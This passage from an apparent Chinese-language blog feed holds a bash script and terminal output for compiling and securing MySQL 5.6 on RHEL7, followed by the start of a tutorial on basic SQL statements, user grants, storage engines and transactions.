class="bash">&#x68C0;&#x67E5;yum&#x6E90;&#x662F;&#x5426;&#x914D;&#x7F6E;&#x597D;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x914D;&#x7F6E;&#x597D;&#x5219;&#x914D;&#x7F6E;yum&#x6E90;</span></span><br><span class="line">yum clean all 1&gt; /dev/null 2&gt;&amp;1 &amp;&amp; yum makecache &amp;&gt; /dev/null</span><br><span class="line">if [ $? -ne 0 ];then</span><br><span class="line"></span><br><span class="line">cd /etc/yum.repos.d</span><br><span class="line"></span><br><span class="line">cat &gt;rhel7.repo&lt;&lt;EOF</span><br><span class="line">[rhel7]</span><br><span class="line">name=rhel7</span><br><span class="line">baseurl=file:///media/cdrom</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=0</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">  mkdir -p /media/cdrom</span><br><span class="line">  mount /dev/cdrom /media/cdrom &amp;&gt;/dev/null</span><br><span class="line">  sed -i -e &apos;/iso9660/d&apos; /etc/fstab</span><br><span class="line">  echo &quot;/dev/cdrom /media/cdrom iso9660 defaults 0 0&quot; &gt;&gt; /etc/fstab</span><br><span class="line">  yum clean all &amp;&gt;/dev/null &amp;&amp; yum makecache &amp;&gt;/dev/null</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x5B89;&#x88C5;&#x4F9D;&#x8D56;&#x5305;&#x53CA;&#x7F16;&#x8BD1;&#x5DE5;&#x5177;</span></span><br><span class="line">yum install -y gcc* make ncurse* perl*</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x5B89;&#x88C5;CMake&#x7F16;&#x8BD1;&#x5DE5;&#x5177;</span></span><br><span class="line">cd /usr/local/src</span><br><span class="line">tar xzvf cmake-2.8.11.2.tar.gz</span><br><span class="line">cd cmake-2.8.11.2</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x90E8;&#x7F72;MySQL&#x6570;&#x636E;&#x5E93;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x540D;&#x4E3A;mysql&#x7684;&#x7528;&#x6237;</span></span><br><span class="line">useradd mysql -s /sbin/nologin</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x7528;&#x4E8E;&#x4FDD;&#x5B58;MySQL&#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x548C;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#x7684;&#x76EE;&#x5F55;&#xFF0C;&#x5E76;&#x628A;&#x8BE5;&#x76EE;&#x5F55;&#x7684;&#x6240;&#x6709;&#x8005;&#x548C;&#x6240;&#x5C5E;&#x7EC4;&#x8EAB;&#x4EFD;&#x4FEE;&#x6539;&#x4E3A;mysql&#x3002;</span></span><br><span class="line">mkdir -p /usr/local/mysql/var</span><br><span class="line">chown -Rf mysql:mysql /usr/local/mysql</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x89E3;&#x538B;&#x3001;&#x7F16;&#x8BD1;&#x3001;&#x5B89;&#x88C5;MySQL&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x3002;&#x5728;&#x7F16;&#x8BD1;&#x6570;&#x636E;&#x5E93;&#x65F6;&#x4F7F;&#x7528;&#x7684;&#x662F;cmake&#x547D;&#x4EE4;&#xFF0C;&#x5176;&#x4E2D;&#xFF0C;-DCMAKE_INSTALL_PREFIX&#x53C2;&#x6570;&#x7528;&#x4E8E;&#x5B9A;&#x4E49;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#xFF0C;-DMYSQL_DATADIR&#x53C2;&#x6570;&#x7528;&#x4E8E;&#x5B9A;&#x4E49;&#x771F;&#x5B9E;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#x7684;&#x76EE;&#x5F55;&#xFF0C;-DSYSCONFDIR&#x5219;&#x662F;&#x5B9A;&#x4E49;MySQL&#x6570;&#x636E;&#x5E93;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#x3002;</span></span><br><span class="line">cd /usr/local/src</span><br><span class="line">tar xzvf mysql-5.6.19.tar.gz</span><br><span class="line">cd mysql-5.6.19</span><br><span class="line">cmake . -DCMAKE_INSTALL_PREFIX=/usr/local/mysql -DMYSQL_DATADIR=/usr/local/mysql/var -DSYSCONFDIR=/etc</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x4E3A;&#x4E86;&#x8BA9;MySQL&#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x6B63;&#x5E38;&#x8FD0;&#x8F6C;&#x8D77;&#x6765;&#xFF0C;&#x9700;&#x8981;&#x5148;&#x5220;&#x9664;/etc&#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x5728;MySQL&#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;scripts&#x5185;&#x627E;&#x5230;&#x4E00;&#x4E2A;&#x540D;&#x4E3A;mysql_install_db&#x7684;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#xFF0C;&#x6267;&#x884C;&#x8FD9;&#x4E2A;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x5E76;&#x4F7F;&#x7528;--user&#x53C2;&#x6570;&#x6307;&#x5B9A;MySQL&#x670D;&#x52A1;&#x7684;&#x5BF9;&#x5E94;&#x8D26;&#x53F7;&#x540D;&#x79F0;&#xFF08;&#x5728;&#x524D;&#x9762;&#x6B65;&#x9AA4;&#x5DF2;&#x7ECF;&#x521B;&#x5EFA;&#xFF09;&#xFF0C;&#x4F7F;&#x7528;--basedir&#x53C2;&#x6570;&#x6307;&#x5B9A;MySQL&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#xFF0C;&#x4F7F;&#x7528;--datadir&#x53C2;&#x6570;&#x6307;&#x5B9A;MySQL&#x771F;&#x5B9E;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6587;&#x4EF6;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#xFF0C;&#x8FD9;&#x6837;&#x5373;&#x53EF;&#x751F;&#x6210;&#x7CFB;&#x7EDF;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#xFF0C;&#x4E5F;&#x4F1A;&#x751F;&#x6210;&#x51FA;&#x65B0;&#x7684;MySQL&#x670D;&#x52A1;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x3002;</span></span><br><span class="line">rm -rf /etc/my.cnf</span><br><span class="line">cd /usr/local/mysql</span><br><span class="line">./scripts/mysql_install_db --user=mysql --basedir=/usr/local/mysql --datadir=/usr/local/mysql/var</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x628A;&#x7CFB;&#x7EDF;&#x65B0;&#x751F;&#x6210;&#x7684;MySQL&#x6570;&#x636E;&#x5E93;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x94FE;&#x63A5;&#x5230;/etc&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;&#x7136;&#x540E;&#x628A;&#x7A0B;&#x5E8F;&#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x5F00;&#x673A;&#x7A0B;&#x5E8F;&#x6587;&#x4EF6;&#x590D;&#x5236;&#x5230;/etc/rc.d/init.d&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;&#x4EE5;&#x4FBF;&#x901A;&#x8FC7;service&#x547D;&#x4EE4;&#x6765;&#x7BA1;&#x7406;MySQL&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#xFF0C;&#x628A;&#x6570;&#x636E;&#x5E93;&#x811A;&#x672C;&#x6587;&#x4EF6;&#x7684;&#x6743;&#x9650;&#x4FEE;&#x6539;&#x6210;755&#x4EE5;&#x4FBF;&#x4E8E;&#x8BA9;&#x7528;&#x6237;&#x6709;&#x6267;&#x884C;&#x8BE5;&#x811A;&#x672C;&#x7684;&#x6743;&#x9650;&#x3002;</span></span><br><span class="line">ln -s my.cnf /etc/my.cnf </span><br><span class="line">cp ./support-files/mysql.server /etc/rc.d/init.d/mysqld</span><br><span class="line">chmod 755 /etc/rc.d/init.d/mysqld</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x7F16;&#x8F91;&#x521A;&#x521A;&#x590D;&#x5236;&#x7684;MySQL&#x6570;&#x636E;&#x5E93;&#x811A;&#x672C;&#x6587;&#x4EF6;&#xFF0C;&#x628A;&#x7B2C;46&#x3001;47&#x884C;&#x7684;basedir&#x4E0E;datadir&#x53C2;&#x6570;&#x5206;&#x522B;&#x4FEE;&#x6539;&#x4E3A;MySQL&#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#x548C;&#x771F;&#x5B9E;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x3002;</span></span><br><span class="line">sed -i &apos;46d&apos; /etc/rc.d/init.d/mysqld &amp;&amp; sed -i &apos;45 abasedir=/usr/local/mysql&apos; /etc/rc.d/init.d/mysqld </span><br><span class="line">sed -i &apos;47d&apos; /etc/rc.d/init.d/mysqld &amp;&amp; sed -i &apos;46 adatadir=/usr/local/mysql/var&apos; /etc/rc.d/init.d/mysqld</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x8BBE;&#x7F6E;PATH&#x53D8;&#x91CF;</span></span><br><span class="line">sed -i &apos;74d&apos; /etc/profile &amp;&amp; sed -i &apos;73 aexport PATH=$PATH:/usr/local/mysql/bin&apos; /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x521B;&#x5EFA;MySQL&#x9ED8;&#x8BA4;&#x7684;&#x6570;&#x636E;&#x6587;&#x6863;&#x5B58;&#x50A8;&#x76EE;&#x5F55;</span></span><br><span class="line">mkdir /var/lib/mysql</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x521B;&#x5EFA;&#x94FE;&#x63A5;&#x6587;&#x4EF6;</span></span><br><span class="line">ln -s /usr/local/mysql/lib/mysql /usr/lib/mysql</span><br><span class="line">ln -s /tmp/mysql.sock /var/lib/mysql/mysql.sock </span><br><span class="line">ln -s /usr/local/mysql/include/mysql /usr/include/mysql</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x542F;&#x52A8;MySQL,&#x628A;mysqld&#x52A0;&#x5165;&#x5F00;&#x673A;&#x542F;&#x52A8;&#x9879;&#x4E2D;&#x3002;</span></span><br><span class="line">service mysqld start</span><br><span class="line">chkconfig mysqld on</span><br><span class="line">echo &quot;MySQL&#x5DF2;&#x5B89;&#x88C5;&#x6210;&#x529F;&#xFF0C;&#x8BF7;&#x6267;&#x884C; source /etc/profile &#x540E;&#xFF0C;&#x518D;&#x6267;&#x884C; mysql_secure_installation &#x6765;&#x5B8C;&#x6210;MySQL&#x6570;&#x636E;&#x5E93;&#x7684;&#x521D;&#x59CB;&#x5316;&#xFF01;&quot;</span><br></pre></td></tr></tbody></table></figure><p>&#x6267;&#x884C;&#x811A;&#x672C;&#x5B89;&#x88C5;MySQL 5.6<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost src]# chmod 755 mysql.sh</span><br><span class="line">[root@localhost src]# ./mysql.sh </span><br><span class="line">Starting MySQL. SUCCESS! </span><br><span class="line">MySQL&#x5DF2;&#x5B89;&#x88C5;&#x6210;&#x529F;&#xFF0C;&#x8BF7;&#x6267;&#x884C; source /etc/profile &#x540E;&#xFF0C;&#x518D;&#x6267;&#x884C; mysql_secure_installation &#x6765;&#x5B8C;&#x6210;MySQL&#x6570;&#x636E;&#x5E93;&#x7684;&#x521D;&#x59CB;&#x5316;&#xFF01;</span><br><span class="line">[root@localhost src]# mysql_secure_installation</span><br><span class="line">-bash: mysql_secure_installation: command not found</span><br><span class="line">[root@localhost src]# </span><br><span class="line">[root@localhost src]# source /etc/profile</span><br><span class="line">Attempting to create directory /root/perl5</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost src]# mysql_secure_installation</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NOTE: RUNNING ALL PARTS OF THIS SCRIPT IS RECOMMENDED FOR ALL MySQL</span><br><span class="line">      SERVERS IN PRODUCTION USE!  PLEASE READ EACH STEP CAREFULLY!</span><br><span class="line"></span><br><span class="line">In order to log into MySQL to secure it, we&apos;ll need the current</span><br><span class="line">password for the root user.  If you&apos;ve just installed MySQL, and</span><br><span class="line">you haven&apos;t set the root password yet, the password will be blank,</span><br><span class="line">so you should just press enter here.</span><br><span class="line"></span><br><span class="line">Enter current password for root (enter for none): &#x76F4;&#x63A5;&#x56DE;&#x8F66;</span><br><span class="line">OK, successfully used password, moving on...</span><br><span class="line"></span><br><span class="line">Setting the root password ensures that nobody can log into the MySQL</span><br><span class="line">root user without the proper authorisation.</span><br><span class="line"></span><br><span class="line">Set root password? [Y/n] y</span><br><span class="line">New password: </span><br><span class="line">Re-enter new password: </span><br><span class="line">Password updated successfully!</span><br><span class="line">Reloading privilege tables..</span><br><span class="line"> ... Success!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">By default, a MySQL installation has an anonymous user, allowing anyone</span><br><span class="line">to log into MySQL without having to have a user account created for</span><br><span class="line">them.  This is intended only for testing, and to make the installation</span><br><span class="line">go a bit smoother.  You should remove them before moving into a</span><br><span class="line">production environment.</span><br><span class="line"></span><br><span class="line">Remove anonymous users? [Y/n] y</span><br><span class="line"> ... Success!</span><br><span class="line"></span><br><span class="line">Normally, root should only be allowed to connect from &apos;localhost&apos;.  This</span><br><span class="line">ensures that someone cannot guess at the root password from the network.</span><br><span class="line"></span><br><span class="line">Disallow root login remotely? [Y/n] y</span><br><span class="line"> ... Success!</span><br><span class="line"></span><br><span class="line">By default, MySQL comes with a database named &apos;test&apos; that anyone can</span><br><span class="line">access.  This is also intended only for testing, and should be removed</span><br><span class="line">before moving into a production environment.</span><br><span class="line"></span><br><span class="line">Remove test database and access to it? [Y/n] y</span><br><span class="line"> - Dropping test database...</span><br><span class="line"> ... Success!</span><br><span class="line"> - Removing privileges on test database...</span><br><span class="line"> ... Success!</span><br><span class="line"></span><br><span class="line">Reloading the privilege tables will ensure that all changes made so far</span><br><span class="line">will take effect immediately.</span><br><span class="line"></span><br><span class="line">Reload privilege tables now? [Y/n] y</span><br><span class="line"> ... Success!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">All done!  If you&apos;ve completed all of the above steps, your MySQL</span><br><span class="line">installation should now be secure.</span><br><span class="line"></span><br><span class="line">Thanks for using MySQL!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Cleaning up...</span><br></pre></td></tr></tbody></table></figure><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost src]<span class="comment"># mysql -uroot -puplooking</span></span><br><span class="line">Warning: Using a password on the command line interface can be insecure.</span><br><span class="line">Welcome to the MySQL monitor.  Commands <span class="keyword">end</span> <span class="keyword">with</span> ; or \g.</span><br><span class="line">Your MySQL connection id is 12</span><br><span class="line">Server version: 5.6.19 Source distribution</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &apos;<span class="keyword">help</span>;&apos; or &apos;\h&apos; for help. <span class="keyword">Type</span> <span class="string">&apos;\c&apos;</span> <span class="keyword">to</span> <span class="keyword">clear</span> the <span class="keyword">current</span> <span class="keyword">input</span> statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">databases</span>;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| Database           |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">3 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">exit</span></span><br><span class="line">Bye</span><br><span class="line">[root@localhost src]<span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;&amp;#x6E90;&amp;#x7801;&amp;#x5B89;&amp;#x88C5;MySQL-5-6&quot;&gt;&lt;a href=&quot;#&amp;#x6E90;&amp;#x7801;&amp;#x5B89;&amp;#x88C5;MySQL-5-6&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x6E90;&amp;#
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MySQL基础</title>
    <link href="https://marnm.github.io//posts/bce68613/"/>
    <id>https://marnm.github.io//posts/bce68613/</id>
    <published>2022-06-07T04:43:21.000Z</published>
    <updated>2022-06-07T05:15:46.622Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x4E00;&#x3001;SQL&#x8BED;&#x53E5;"><a href="#&#x4E00;&#x3001;SQL&#x8BED;&#x53E5;" class="headerlink" title="&#x4E00;&#x3001;SQL&#x8BED;&#x53E5;"></a>&#x4E00;&#x3001;SQL&#x8BED;&#x53E5;</h2><p>DDL    &#x6570;&#x636E;&#x5E93;&#x5B9A;&#x4E49;&#x8BED;&#x8A00;    create drop alter<br>DML    &#x6570;&#x636E;&#x5E93;&#x64CD;&#x4F5C;&#x8BED;&#x8A00;    insert delete update<br>DCL    &#x6570;&#x636E;&#x5E93;&#x63A7;&#x5236;&#x8BED;&#x8A00;    grant revoke<br>DQL    &#x6570;&#x636E;&#x5E93;&#x67E5;&#x8BE2;&#x8BED;&#x8A00;    select   </p><p>&#x672C;&#x7AE0;&#x8981;&#x6C42;&#x638C;&#x63E1;sql&#x8BED;&#x53E5;&#x7684;&#x57FA;&#x672C;&#x7528;&#x6CD5;&#xFF0C;&#x5305;&#x62EC;create database,create table, drop database,drop table,insert into,update,delete from,grant,revoke; &#x5176;&#x4ED6;sql&#x8BED;&#x53E5;&#x4F5C;&#x4E3A;&#x62D3;&#x5C55;&#x3002;    </p><p>MySQL&#x4E2D;&#x7684;&#x8BED;&#x6CD5;&#x683C;&#x5F0F;  </p><ol><li>&#x9ED8;&#x8BA4;&#x4EE5; <code>;</code> &#x63D0;&#x4EA4;</li><li>&#x5173;&#x952E;&#x5B57;&#x5927;&#x5C0F;&#x5199;&#x4E0D;&#x654F;&#x611F;&#xFF1B;&#x5E93;&#x540D;&#x3001;&#x8868;&#x540D;&#x3001;&#x6570;&#x636E;&#x90FD;&#x662F;&#x533A;&#x5206;&#x5927;&#x5C0F;&#x5199;&#xFF1B;</li><li>&#x4F7F;&#x7528;&#x7A7A;&#x683C;</li></ol><ul><li>DQL    <ul><li>&#x6570;&#x636E;&#x5E93;&#x67E5;&#x8BE2;&#x8BED;&#x8A00; select</li><li>&#x67E5;&#x8BE2;&#x6570;&#x636E;&#x5E93;show databases;</li><li>&#x67E5;&#x8BE2;&#x8868;<br>  show tables;<br>  show tables from test;</li><li>&#x67E5;&#x770B;&#x8868;&#x7684;&#x7ED3;&#x6784;          desc mysql.user;</li><li>&#x67E5;&#x770B;&#x8868;&#x4E2D;&#x7684;&#x6570;&#x636E;       select host,user,password from mysql.user where user=&#x2019;root&#x2019;;</li></ul></li></ul><p>-&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2013;  </p><ul><li><p>DDL    </p><ul><li>&#x6570;&#x636E;&#x5E93;&#x5B9A;&#x4E49;&#x8BED;&#x8A00; create drop alter</li><li>&#x521B;&#x5EFA;&#x5E93; create database dbname;</li><li>&#x5220;&#x9664;&#x5E93; drop database dbname;</li><li>&#x521B;&#x5EFA;&#x8868; create table tbname (id int,name char(20),age int);</li><li>&#x5220;&#x9664;&#x8868; drop table tbname;</li></ul></li><li><p>&#x5E93;&#x540D;&#x8868;&#x540D;&#x547D;&#x540D;&#x89C4;&#x5219;</p><ul><li>&#x82F1;&#x6587;&#x5B57;&#x6BCD;&#x3001;&#x6570;&#x5B57;&#x3001;&#x4E0B;&#x5212;&#x7EBF;</li><li>&#x4EE5;&#x82F1;&#x6587;&#x5B57;&#x6BCD;&#x5F00;&#x5934;</li><li>&lt;=32&#x4E2A;&#x5B57;&#x7B26;</li></ul></li></ul><p>&#x5207;&#x6362;&#x5230;&#x6267;&#x884C;&#x6570;&#x636E;&#x5E93;&#xFF1A;<br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use dbname</span><br><span class="line">Database changed</span><br></pre></td></tr></tbody></table></figure><p></p><p>-&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2013;  </p><ul><li>DML    &#x6570;&#x636E;&#x5E93;&#x64CD;&#x4F5C;&#x8BED;&#x8A00;     insert delete update<ul><li>&#x63D2;&#x5165;&#x4E00;&#x884C;          <ul><li>insert into dbname.tbname values (1,&#x2019;superman&#x2019;,21);</li><li>insert into dbname.tbname set id=1,name=&#x2019;superman&#x2019;,age=21;</li></ul></li><li>&#x63D2;&#x5165;&#x591A;&#x884C;         <ul><li>insert into dbname.tbname values (2,&#x2019;batman1&#x2019;,21),(3,&#x2019;batman2&#x2019;,22),(4,&#x2019;batman3&#x2019;,23),(5,&#x2019;batman4&#x2019;,24);</li><li>insert into dbname.tbname (id,age) values (6,26);    </li></ul></li><li>update                 update dbname.tbname set age=14 where id=2 or id=3;</li><li>delete                 delete from dbname.tbname where id=2;</li></ul></li></ul><p>-&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2013;</p><ul><li>DCL    &#x6570;&#x636E;&#x5E93;&#x63A7;&#x5236;&#x8BED;&#x8A00;    grant &#x6388;&#x6743; revoke &#x6536;&#x56DE;&#x6388;&#x6743;<ul><li><code>grant all on *.* to &apos;batman&apos;@&apos;172.25.0.12&apos; identified by &apos;uplooking&apos;;</code><ul><li>grant &#x5173;&#x952E;&#x5B57;</li><li>all    &#x6240;&#x6709;&#x6743;&#x9650;&#x9664;&#x4E86;grant&#x4E4B;&#x5916;</li><li>on <em>.</em>  &#x6240;&#x6709;&#x7684;&#x5E93;&#x6240;&#x6709;&#x7684;&#x8868;</li><li>to user@host &#x6743;&#x9650;&#x662F;&#x7ED9;&#x8C01;&#x7684;&#xFF0C;&#x4ECE;&#x54EA;&#x91CC;&#x6765;&#x7684;</li><li>identified by &#x5BC6;&#x7801;</li></ul></li><li><code>flush privileges;</code> &#x5237;&#x65B0;&#x6388;&#x6743;&#x8868;</li></ul></li></ul><h2 id="&#x4E8C;&#x3001;&#x8868;&#x7684;&#x5B58;&#x50A8;&#x5F15;&#x64CE;"><a href="#&#x4E8C;&#x3001;&#x8868;&#x7684;&#x5B58;&#x50A8;&#x5F15;&#x64CE;" class="headerlink" title="&#x4E8C;&#x3001;&#x8868;&#x7684;&#x5B58;&#x50A8;&#x5F15;&#x64CE;"></a>&#x4E8C;&#x3001;&#x8868;&#x7684;&#x5B58;&#x50A8;&#x5F15;&#x64CE;</h2><p>&#x5B58;&#x50A8;&#x5F15;&#x64CE;  &#x6570;&#x636E;&#x5E93;&#x8BFB;&#x5199;&#x6570;&#x636E;&#x7684;&#x65B9;&#x5F0F;&#xFF0C;&#x51B3;&#x5B9A;&#x4E86;&#x8BFB;&#x5199;&#x6570;&#x636E;&#x7684;&#x5FEB;&#x6162;</p><table><thead><tr><th>&#x4E8B;&#x52A1;</th><th>&#x9501;&#x673A;&#x5236;</th><th>&#x9002;&#x7528;&#x573A;&#x666F;</th></tr></thead><tbody><tr><td>myisam</td><td>no</td><td>&#x8868;&#x9501;</td><td>&#x5206;&#x6790;&#x578B;</td></tr></tbody></table><p>innodb |  yes    |   &#x884C;&#x9501;     |     &#x91D1;&#x94B1;+&#x7EBF;&#x4E0A;&#x9AD8;&#x5E76;&#x53D1; |</p><h2 id="&#x4E09;&#x3001;&#x4E8B;&#x52A1;"><a href="#&#x4E09;&#x3001;&#x4E8B;&#x52A1;" class="headerlink" title="&#x4E09;&#x3001;&#x4E8B;&#x52A1;"></a>&#x4E09;&#x3001;&#x4E8B;&#x52A1;</h2><p>&#x4E8B;&#x52A1;(Transaction)&#x662F;&#x5E76;&#x53D1;&#x63A7;&#x5236;&#x7684;&#x57FA;&#x672C;&#x5355;&#x4F4D;&#x3002;</p><p><code>&#x6240;&#x8C13;&#x4E8B;&#x52A1;,&#x5B83;&#x662F;&#x4E00;&#x4E2A;&#x64CD;&#x4F5C;&#x5E8F;&#x5217;,&#x8FD9;&#x4E9B;&#x64CD;&#x4F5C;&#x8981;&#x4E48;&#x90FD;&#x6267;&#x884C;,&#x8981;&#x4E48;&#x90FD;&#x4E0D;&#x6267;&#x884C;, &#x5B83;&#x662F;&#x4E00;&#x4E2A;&#x4E0D;&#x53EF;&#x5206;&#x5272;&#x7684;&#x5DE5;&#x4F5C;&#x5355;&#x4F4D;&#x3002;</code>&#x4F8B;&#x5982;,&#x94F6;&#x884C;&#x8F6C;&#x5E10;&#x5DE5;&#x4F5C;:&#x4ECE;&#x4E00;&#x4E2A;&#x5E10;&#x53F7;&#x6263;&#x6B3E;&#x5E76; 